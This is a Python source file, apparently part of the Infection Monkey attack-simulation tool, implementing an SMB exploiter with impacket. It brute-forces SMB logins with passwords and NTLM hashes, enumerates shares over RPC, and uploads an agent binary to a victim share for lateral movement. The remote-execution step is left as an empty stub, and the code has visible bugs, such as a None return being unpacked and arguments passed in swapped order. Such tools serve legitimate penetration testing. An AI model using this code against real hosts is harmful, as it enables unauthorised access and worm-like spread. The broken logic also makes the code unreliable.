import logging
import ntpath
from io import BytesIO
from pathlib import PurePath
from typing import Any, Dict, Iterable, Optional, Tuple, Type

# SMB
from impacket.dcerpc.v5 import srvs, transport
from impacket.dcerpc.v5.rpcrt import DCERPC_v5
from impacket.smbconnection import SMB2_DIALECT_002, SMB2_DIALECT_21, SMB_DIALECT, SMBConnection

from common.credentials import Credentials, LMHash, NTHash, Password, get_plaintext
from common.event_queue import IAgentEventPublisher
from infection_monkey.exploit import IAgentBinaryRepository
from infection_monkey.exploit.tools import generate_brute_force_credentials
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.i_puppet import TargetHost

logger = logging.getLogger(__name__)


class SMBExploiter:
    def __init__(
        self,
        credentials: Iterable[Credentials],
        agent_event_publisher: IAgentEventPublisher,
        agent_binary_repository: IAgentBinaryRepository,
    ):
        # TODO: Add options
        self._credentials = credentials
        self._agent_event_publisher = agent_event_publisher
        self._agent_binary_repository = agent_binary_repository

    def exploit_host(self, host):
        smb, credentials = self.brute_force(host)
        destination_path = get_agent_dst_path(host)
        agent_binary = self._agent_binary_repository.get_agent_binary(host.operating_system)

        remote_path = self.copy_agent(agent_binary, host, smb, destination_path, credentials)
        if not remote_path:
            logger.debug(f"Failed to copy agent to {host}")
            return

        if not self.run_agent(host, remote_path):
            logger.debug(f"Failed to run agent on {host}")
            return

    def brute_force(self, host):
        """Brute force SMB login"""
        credentials_list = generate_brute_force_credentials(self._credentials)
        for credentials in credentials_list:
            # TODO: Test if we only need to create the connection once
            smb_connection = SMB.create_connection(host)
            if not smb_connection:
                continue

            smb_connection = SMB.login(smb_connection, credentials)
            if not smb_connection:
                continue

            # TODO: Set the timeout based on config setting
            # smb_connection.setTimeout(5)

            if SMB.logout_guest(smb_connection):
                continue

            # At this point, we've successfully logged in with a non-guest user
            # Can we break out of the loop here?
            return (smb_connection, credentials)

        return None

    def copy_agent(
        self,
        agent_binary: BytesIO,
        host,
        smb_connection: SMBConnection,
        path: PurePath,
        credentials,
    ) -> Optional[str]:
        """True if the agent was copied successfully, False otherwise"""
        if not SMB.query_server_info(smb_connection):
            return None

        shares = self.query_shares(host, path, smb_connection)
        for remote_path, share_name, share_path in self.connected_shares(
            host, shares, smb_connection, credentials
        ):
            destination = self.copy_agent_binary(
                agent_binary, host, smb_connection, remote_path, share_name, share_path
            )
            if destination:
                return destination

        return None

    def query_shares(self, host: TargetHost, path: PurePath, smb: SMBConnection):
        resp = SMB.query_shared_resources(smb)
        if not resp:
            return ()

        high_priority_shares: Tuple[Tuple[str, Dict[str, Any]], ...] = ()
        low_priority_shares: Tuple[Tuple[str, Dict[str, Any]], ...] = ()
        file_name = path.name

        for i in range(len(resp)):
            share_name = resp[i]["shi2_netname"].strip("\0 ")
            share_path = resp[i]["shi2_path"].strip("\0 ")
            current_uses = resp[i]["shi2_current_uses"]
            max_uses = resp[i]["shi2_max_uses"]

            if current_uses >= max_uses:
                logger.debug(
                    f"Skipping share '{share_name}' on victim %r because max uses is exceeded",
                    host,
                )
                continue
            elif not share_path:
                logger.debug(
                    f"Skipping share '{share_name}' on victim %r because share path is invalid",
                    host,
                )
                continue

            share_info = {"share_name": share_name, "share_path": share_path}

            if str(path).lower().startswith(share_path.lower()):
                high_priority_shares += ((ntpath.sep + str(path)[len(share_path) :], share_info),)

            low_priority_shares += ((ntpath.sep + file_name, share_info),)

        return high_priority_shares + low_priority_shares

    def connected_shares(
        self, shares, host: TargetHost, smb: SMBConnection, credentials: Credentials
    ):
        """Yields a tuple of (remote_path, share_name, share_path)
        Side effect: the SMBConnection is connected to the share"""
        # Attempt to connect to a share over SMB
        for remote_path, share in shares:
            share_name = share["share_name"]
            share_path = share["share_path"]

            # TODO: Do we really need to handle reconnects?
            if not smb:
                smb = self.connect_with_user(host, credentials)
                if not smb:
                    break

            try:
                smb.connectTree(share_name)
            except Exception as exc:
                logger.error(
                    f'Error connecting tree to share "{share_name}" on victim {host}: {exc}'
                )
                continue

            yield remote_path, share_name, share_path

    def connect_with_user(self, host: TargetHost, credentials: Credentials):
        smb = SMB.create_connection(host)
        if not smb:
            return None

        smb_connection = SMB.login(smb, credentials)
        if not smb_connection:
            return None

        return smb_connection

    def copy_agent_binary(
        self,
        agent_binary: BytesIO,
        host: TargetHost,
        smb: SMBConnection,
        remote_path: str,
        share_name: str,
        share_path: str,
    ) -> Optional[str]:
        logger.debug(
            f"Trying to copy monkey file to share '{share_name}' [%s + %s] on victim {host}",
            share_path,
            remote_path,
        )

        try:
            # TODO: Use config timeout value
            # smb.setTimeout(timeout)
            smb.putFile(share_name, remote_path, agent_binary.read)

            logger.info(
                f"Copied monkey agent to remote share '{share_name}' "
                f"[{share_path}] on victim {host}"
            )

            return ntpath.join(share_path, remote_path.strip(ntpath.sep))
        except Exception as exc:
            logger.error(f"Error uploading monkey to share '{share_name}' on victim {host}: {exc}")
            return None

    def run_agent(self, host, path: str):
        # - Create RPC connection
        # - Build agent run command
        # - Use RPC to run the agent on the victim
        pass


def secret_for_type(credentials: Credentials, secret_type: Type) -> str:
    return get_plaintext(credentials.secret) if type(credentials.secret) == secret_type else ""


class SMB:
    @classmethod
    def create_connection(self, host: TargetHost) -> SMBConnection:
        # Create a SMB connection with the credentials
        try:
            return SMBConnection(
                str(host.ip), str(host.ip), sess_port=445, preferredDialect=SMB_DIALECT
            )
        except Exception as err:
            logger.debug(
                f"Failed to create SMB connection to {host} on port 445. Trying port 139: {err}"
            )

            try:
                return SMBConnection("*SMBSEVER", str(host.ip), sess_port=139)
            except Exception as err:
                logger.debug(f"Failed to create SMB connection to {host} on port 139: {err}")
                return None

    @classmethod
    def get_dialect(self, smb: SMBConnection) -> str:
        return {
            SMB_DIALECT: "SMBv1",
            SMB2_DIALECT_002: "SMBv2.0",
            SMB2_DIALECT_21: "SMBv2.1",
        }.get(smb.getDialect(), "SMBv3.0")

    @classmethod
    def login(self, smb: SMBConnection, credentials: Credentials) -> bool:
        """True if login succeeded, False otherwise"""
        try:
            smb.login(
                credentials.identity,
                secret_for_type(credentials, Password),
                "",
                secret_for_type(credentials, LMHash),
                secret_for_type(credentials, NTHash),
            )
        except Exception as err:
            logger.debug(f"Failed to login to with user {credentials.identity}: {err}")
            return False
        return True

    @classmethod
    def logout_guest(self, smb: SMBConnection) -> bool:
        if smb.isGuestSession() > 0:
            try:
                smb.logoff()
            except Exception:
                # TODO: If we failed to logout, we should handle that
                pass

            return True
        return False

    @classmethod
    def query_server_info(self, smb: SMBConnection):
        try:
            info = SMB.execute_rpc_call(smb, "hNetrServerGetInfo", 102)
        except Exception as err:
            logger.debug(f"Failed to query server info: {err}")
            return None

        return info

    @classmethod
    def query_shared_resources(self, smb: SMBConnection):
        try:
            shares = SMB.execute_rpc_call(smb, "hNetrShareEnum", 2)
        except Exception as err:
            logger.debug(f"Failed to query shared resources: {err}")
            return None

        return shares

    @staticmethod
    def execute_rpc_call(smb, rpc_func, *args):
        dce = SMB.get_dce_bind(smb)
        rpc_method_wrapper = getattr(srvs, rpc_func, None)
        if not rpc_method_wrapper:
            raise ValueError("Cannot find RPC method '%s'" % (rpc_method_wrapper,))

        return rpc_method_wrapper(dce, *args)

    @staticmethod
    def get_dce_bind(smb: SMBConnection) -> DCERPC_v5:
        rpctransport = transport.SMBTransport(
            smb.getRemoteHost(), smb.getRemoteHost(), filename=r"\srvsvc", smb_connection=smb
        )
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(srvs.MSRPC_UUID_SRVS)

        return dce
